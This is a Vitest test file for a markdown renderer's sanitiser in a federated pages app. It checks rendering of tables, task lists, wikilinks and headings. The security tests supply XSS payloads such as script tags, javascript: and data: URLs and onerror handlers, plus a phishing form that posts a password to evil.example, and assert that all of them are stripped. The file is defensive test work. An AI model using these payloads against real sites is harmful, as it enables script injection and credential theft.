import { describe, it, expect } from 'vitest'
import { renderMarkdown, extractHeadings } from './markdown'

describe('renderMarkdown', () => {
  it('renders bold + italic', () => {
    const html = renderMarkdown('**bold** _em_')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<em>em</em>')
  })

  it('renders GFM tables', () => {
    const html = renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |')
    expect(html).toContain('<table>')
    expect(html).toContain('<th>a</th>')
  })

  it('renders task lists (GFM)', () => {
    const html = renderMarkdown('- [x] done\n- [ ] todo')
    expect(html).toContain('<input')
    expect(html).toContain('checked')
    expect(html).toContain('disabled')
  })

  it('strips <script> and javascript: URLs', () => {
    const html = renderMarkdown(
      '<script>alert(1)</script>\n[x](javascript:alert(1))',
    )
    expect(html).not.toContain('<script>')
    expect(html).not.toContain('javascript:')
  })

  it('strips inline event handlers', () => {
    const html = renderMarkdown('<img src="x" onerror="alert(1)" />')
    expect(html).not.toContain('onerror')
  })

  it('keeps safe http(s) links + adds mailto', () => {
    const html = renderMarkdown(
      '[site](https://example.com) [mail](mailto:a@b.co)',
    )
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('href="mailto:a@b.co"')
  })

  it('rewrites [[Wikilinks]] to /pages?title=...', () => {
    const html = renderMarkdown('See [[Other Page]] for more.')
    expect(html).toContain('href="/pages?title=Other%20Page"')
    expect(html).toContain('>Other Page</a>')
  })

  it('escapes raw HTML it does not recognise', () => {
    const html = renderMarkdown('Hello <iframe src="http://evil"></iframe>')
    expect(html).not.toContain('<iframe')
  })

  it('strips the leading slash from /api/ image sources for ingress', () => {
    // Server-rendered Page markdown can carry ``![](/api/media/<token>)``;
    // an absolute path bypasses ``<base href>``, which under HA Supervisor
    // ingress would 404 against HA Core's origin. The DOMPurify hook
    // rewrites the slash off so the URL resolves relative to the document
    // base — see ``markdown.ts``.
    const html = renderMarkdown('![](/api/media/abc?token=x)')
    expect(html).toContain('src="api/media/abc?token=x"')
    expect(html).not.toContain('src="/api/media/')
  })

  describe('allow-list holds against hostile raw HTML (federated pages)', () => {
    const host = (html: string) => {
      const d = document.createElement('div')
      d.innerHTML = html
      return d
    }

    it('strips a phishing <form> with inputs, buttons, select and textarea', () => {
      const html = renderMarkdown(
        '<form action="https://evil.example/steal" method="post">'
        + '<input type="password" name="pw"><input type="text" name="u">'
        + '<select name="s"><option>a</option></select>'
        + '<textarea name="t"></textarea>'
        + '<button type="submit">Log in</button></form>',
      )
      const d = host(html)
      expect(d.querySelector('form')).toBeNull()
      expect(d.querySelector('button')).toBeNull()
      expect(d.querySelector('select')).toBeNull()
      expect(d.querySelector('textarea')).toBeNull()
      expect(d.querySelector('input')).toBeNull()
      expect(html).not.toContain('evil.example')
    })

    it('strips autoplaying <video> and <audio>', () => {
      const d = host(renderMarkdown(
        '<video autoplay src="https://evil.example/v.mp4"></video>'
        + '<audio autoplay src="https://evil.example/a.mp3"></audio>',
      ))
      expect(d.querySelector('video')).toBeNull()
      expect(d.querySelector('audio')).toBeNull()
    })

    it('drops class attributes so a page cannot borrow app chrome', () => {
      const d = host(renderMarkdown(
        '<p class="sh-modal-backdrop">x</p>\n\n```js\nlet a = 1\n```',
      ))
      expect(d.querySelector('[class]')).toBeNull()
      expect(d.querySelector('pre code')?.textContent).toContain('let a = 1')
    })

    it('keeps GFM checkboxes but forces them disabled', () => {
      const d = host(renderMarkdown(
        '- [x] done\n\n<input type="checkbox" name="c">',
      ))
      const boxes = Array.from(d.querySelectorAll('input'))
      expect(boxes.length).toBe(2)
      for (const b of boxes) {
        expect(b.getAttribute('type')).toBe('checkbox')
        expect(b.hasAttribute('disabled')).toBe(true)
        expect(b.hasAttribute('name')).toBe(false)
      }
    })

    it.each([
      ['javascript:alert(1)'],
      ['JaVaScRiPt:alert(1)'],
      ['data:text/html,<script>alert(1)</script>'],
      ['vbscript:msgbox(1)'],
      ['blob:https://x/y'],
      ['httpsx:alert(1)'],
    ])('drops href %s from raw and markdown links', (bad) => {
      const d = host(renderMarkdown(
        `[md](${bad})\n\n<a href="${bad}">raw</a>`,
      ))
      for (const a of Array.from(d.querySelectorAll('a'))) {
        expect(a.hasAttribute('href')).toBe(false)
      }
    })

    it.each([
      ['data:image/png;base64,iVBORw0KGgo='],
      ['data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
      [' DATA:image/gif;base64,R0lGOD=='],
    ])('drops a data: image src %s (raw and markdown)', (bad) => {
      // DOMPurify lets ``data:`` through on <img> by default; Pages never
      // need it (uploads become api/media/…), and a peer-supplied data:
      // SVG / tracking blob has no place in a federated body.
      const d = host(renderMarkdown(`![md](${bad.trim()})\n\n<img src="${bad}" alt="raw">`))
      expect(d.querySelectorAll('img').length).toBe(0)
      expect(d.querySelector('a')).toBeNull()
      expect(d.innerHTML).not.toMatch(/data:/i)
    })

    it.each([
      ['//evil.example/x'],
      ['\\\\evil.example/x'],
      ['/\\evil.example/x'],
      ['\\/evil.example/x'],
      [' //evil.example/x'],
    ])('drops protocol-relative %s on links and images, like safeHref', (bad) => {
      // ``//host`` and its backslash spellings resolve to another host —
      // safeHref refuses them, so the markdown renderer does too.
      const d = host(renderMarkdown(
        `<a href="${bad}">raw</a>\n\n<img src="${bad}" alt="i">`,
      ))
      expect(d.querySelector('a')?.hasAttribute('href')).toBe(false)
      expect(d.querySelector('img')).toBeNull()
      expect(d.innerHTML).not.toContain('evil.example')
    })

    it('drops a protocol-relative markdown link', () => {
      const d = host(renderMarkdown('[x](//evil.example/x) [y](/feed)'))
      const hrefs = Array.from(d.querySelectorAll('a')).map((a) => a.getAttribute('href'))
      expect(hrefs).toEqual([null, '/feed'])
    })

    it('keeps scheme-less attribute values (table align, image size, api/ src)', () => {
      const d = host(renderMarkdown(
        '| a |\n|:-:|\n| 1 |\n\n<img src="/api/media/x" width="120" alt="pic">',
      ))
      expect(d.querySelector('th')?.getAttribute('align')).toBe('center')
      const img = d.querySelector('img')
      expect(img?.getAttribute('src')).toBe('api/media/x')
      expect(img?.getAttribute('width')).toBe('120')
    })

    it('still renders links, lists and code', () => {
      const d = host(renderMarkdown(
        '[a](https://example.com) [b](http://example.org) '
        + '[c](mailto:x@y.z) [d](/feed)\n\n- one\n- two\n\n1. first\n\n'
        + '`inline` and\n\n```\nblock\n```',
      ))
      const hrefs = Array.from(d.querySelectorAll('a')).map(
        (a) => a.getAttribute('href'),
      )
      expect(hrefs).toEqual([
        'https://example.com', 'http://example.org', 'mailto:x@y.z', '/feed',
      ])
      expect(d.querySelectorAll('ul li').length).toBe(2)
      expect(d.querySelectorAll('ol li').length).toBe(1)
      expect(d.querySelector('p code')?.textContent).toBe('inline')
      expect(d.querySelector('pre code')?.textContent).toContain('block')
    })
  })

  it('leaves non-/api absolute URLs untouched', () => {
    const html = renderMarkdown('[x](/feed)')
    // ``/feed`` is a local nav link; the IngressLocationProvider's click
    // interceptor handles the prefix at navigation time. Only ``/api/``
    // bodies need the URL surgery (they hit ``fetch``, not the router).
    expect(html).toContain('href="/feed"')
  })
})

describe('extractHeadings', () => {
  it('collects ## and ### with slugs', () => {
    const src = '# H1\n## Section A\n### Sub\n## Section B'
    const out = extractHeadings(src)
    expect(out).toEqual([
      { depth: 2, text: 'Section A', slug: 'section-a' },
      { depth: 3, text: 'Sub',       slug: 'sub' },
      { depth: 2, text: 'Section B', slug: 'section-b' },
    ])
  })

  it('returns [] on empty input', () => {
    expect(extractHeadings('')).toEqual([])
  })
})

describe('renderMarkdown — no Referer to third parties', () => {
  const parse = (html: string): HTMLElement => {
    const div = document.createElement('div')
    div.innerHTML = html
    return div
  }

  it('local uploads get the attributes too (ingress-relative src kept)', () => {
    const img = parse(renderMarkdown('![p](/api/media/abc.webp)')).querySelector('img')!
    expect(img.getAttribute('src')).toBe('api/media/abc.webp')
    expect(img.getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(img.getAttribute('loading')).toBe('lazy')
  })

  it('external links carry rel="noopener noreferrer"', () => {
    const a = parse(renderMarkdown('[site](https://example.org/x)')).querySelector('a')!
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('an author-supplied rel is replaced, not trusted', () => {
    const a = parse(renderMarkdown('<a href="https://e.example" rel="opener">e</a>'))
      .querySelector('a')!
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('an external href with leading whitespace still gets rel', () => {
    const a = parse(renderMarkdown('<a href=" https://e.example">e</a>')).querySelector('a')!
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('in-app links (wikilinks) are left without rel', () => {
    const a = parse(renderMarkdown('[[Home]]')).querySelector('a')!
    expect(a.getAttribute('href')).toBe('/pages?title=Home')
    expect(a.hasAttribute('rel')).toBe(false)
  })
})

describe('renderMarkdown — no third-party image fetches', () => {
  // Owner decision 2026-10-05: an external picture in user content would
  // load from every viewer's browser (a tracking pixel — IP + view time
  // to the image host). Only uploaded (local) pictures render; anything
  // else becomes a plain link the reader may choose to open.
  const parse = (html: string): HTMLElement => {
    const div = document.createElement('div')
    div.innerHTML = html
    return div
  }
  const externalSrcs = (d: HTMLElement): string[] =>
    Array.from(d.querySelectorAll('img'))
      .map((i) => i.getAttribute('src') ?? '')
      .filter((s) => !s.startsWith('api/'))

  it('an external markdown image becomes a link labelled with its alt', () => {
    const d = parse(renderMarkdown('![A cat](https://img.example.net/cat.png)'))
    expect(d.querySelector('img')).toBeNull()
    const a = d.querySelector('a')!
    expect(a.getAttribute('href')).toBe('https://img.example.net/cat.png')
    expect(a.textContent).toBe('A cat')
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    expect(a.getAttribute('target')).toBe('_blank')
  })

  it('an alt-less external image is labelled with its host', () => {
    const d = parse(renderMarkdown('![](http://pix.example.org:8080/t.gif?u=1)'))
    expect(d.querySelector('img')).toBeNull()
    const a = d.querySelector('a')!
    expect(a.getAttribute('href')).toBe('http://pix.example.org:8080/t.gif?u=1')
    expect(a.textContent).toBe('pix.example.org')
  })

  it('raw <img> HTML with an external src becomes a link too', () => {
    const d = parse(renderMarkdown(
      '<img src="https://x.example/a.png" alt="a" referrerpolicy="unsafe-url" loading="eager">',
    ))
    expect(externalSrcs(d)).toEqual([])
    expect(d.querySelector('img')).toBeNull()
    expect(d.querySelector('a')?.getAttribute('href')).toBe('https://x.example/a.png')
  })

  it('an external image inside a link becomes text, not a nested link', () => {
    const d = parse(renderMarkdown(
      '[![logo](https://x.example/logo.png)](https://x.example/)',
    ))
    expect(d.querySelector('img')).toBeNull()
    const links = Array.from(d.querySelectorAll('a'))
    expect(links.length).toBe(1)
    expect(links[0].getAttribute('href')).toBe('https://x.example/')
    expect(links[0].textContent).toBe('logo')
  })

  it.each([
    ['javascript:alert(1)'],
    ['data:image/png;base64,iVBORw0KGgo='],
    ['blob:https://x/y'],
    ['ftp://x.example/a.png'],
    ['//x.example/a.png'],
    ['pic.png'],
  ])('drops a non-http(s), non-local image source %s', (bad) => {
    const d = parse(renderMarkdown(`![alt](${bad})\n\n<img src="${bad}">`))
    expect(d.querySelector('img')).toBeNull()
    expect(d.querySelector('a')).toBeNull()
    expect(d.innerHTML).not.toContain(bad)
    expect(d.textContent).toContain('alt')
  })

  it('a hostile alt cannot inject markup into the link label', () => {
    const d = parse(renderMarkdown(
      '<img src="https://x.example/a.png" alt="<b onclick=1>x</b>">',
    ))
    expect(d.querySelector('b')).toBeNull()
    expect(d.querySelector('a')?.textContent).toBe('<b onclick=1>x</b>')
  })

  it('a mixed body keeps the uploaded picture and links the external one', () => {
    const d = parse(renderMarkdown(
      '![up](/api/media/abc.webp)\n\n![ext](https://img.example.net/x.png)',
    ))
    const imgs = Array.from(d.querySelectorAll('img'))
    expect(imgs.map((i) => i.getAttribute('src'))).toEqual(['api/media/abc.webp'])
    expect(d.querySelector('a')?.getAttribute('href')).toBe('https://img.example.net/x.png')
  })
})
